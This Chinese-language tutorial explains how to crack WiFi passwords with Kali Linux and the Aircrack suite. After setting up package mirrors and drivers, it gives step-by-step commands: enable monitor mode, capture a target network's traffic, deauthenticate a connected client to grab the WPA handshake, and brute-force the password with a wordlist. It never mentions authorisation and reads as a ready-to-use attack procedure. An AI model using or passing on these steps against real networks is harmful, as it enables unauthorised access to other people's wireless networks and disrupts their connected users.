# Kali：Aircrack破解无线网络

## 导读

> 用Kail的Aircrack工具系统破解WiFi密码。

准备工作

```shell
# 用文本编辑器打开sources.list,手动添加更新源
leafpad /etc/apt/sources.list

# 更新源
# 阿里云
deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
# 中科大
# deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
# deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
# 清华大学
# deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
# deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
# 官方源
#deb http://http.kali.org/kali kali-rolling main non-free contrib
#deb-src http://http.kali.org/kali kali-rolling main non-free contrib

# 清除缓存索引
apt-get clean

# 刷新源，获得最近的软件包的列表
apt-get update

# 更新现有的软件包
apt-get upgrade

# 根据依赖关系更新
apt-get dist-upgrade

# 安装rtl8812au网卡驱动
apt-get install realtek-rtl88xxau-dkms

# 安装Wicd网络管理器
apt-get install wicd

# 安装谷歌输入法
apt-get install fcitx fcitx-googlepinyin
```

1.结束进程

```shell
airmon-ng check kill
```

2.载入网卡

```shell
airmon-ng start wlan0（自己的网卡名）
```

3.建立监听

```shell
airodump-ng wlan0
```

4.模拟WiFi 信号

```shell
airodump-ng --ivs -w wifi-passwd --bssid WiFi的MAC -c ch wlan0

# 参数
–ivs ：指定生成文件的格式，这里格式是ivs（比如：abc.ivs）
-w ：指定文件的名称叫什么，这里叫wifi-pass
–bssid ：目标WiFi的MAC地址
-c ：指定我们模拟的WiFi的信道（ch）
```

5.攻击目标

```shell
aireplay-ng -0 20 -a WiFi的MAC -c 客户端的MAC wlan0

# 参数
-0 ：发送工具数据包的数量，这里是20个(无限次攻击改成0 )
-a ：指定目标AP的MAC地址
-c ：指定用户的MAC地址，（正在使用WiFi的客户端的MAC）
```

出现信息（WPA handshake）密码信息抓取成功，抓取到的密码默认保存在主目录中

6.破解密码文件

```shell
aircrack-ng wifi-passwd-01.ivs -w /mnt/hgfs/Share/word.txt

# 参数
wifi-pass-01.ivs ：密码文件
-w ： 指定密码字典
```
